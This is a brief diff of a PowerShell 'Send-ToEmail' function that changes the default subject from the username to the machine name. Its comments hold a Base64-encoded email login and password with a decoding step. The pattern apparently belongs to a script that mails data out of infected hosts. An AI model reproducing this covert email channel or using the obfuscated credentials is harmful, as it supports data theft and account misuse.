@@ -1,4 +1,4 @@
-function Send-ToEmail([string]$email,[string]$body,[string]$subj=$env:username){
+function Send-ToEmail([string]$email,[string]$body,[string]$subj=[Environment]::MachineName){
     # $UsernameEnc = "eABhAGsAZQByAC4AaQBzAGkAMAAwADcAQABnAG0AYQBpAGwALgBjAG8AbQA=";
     # $PasswordEnc = "cAB2AGsAcgBmAHIAeABpAHAAeABqAHIAdgBlAHcAZgA=";
     # $Username = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($UsernameEnc))
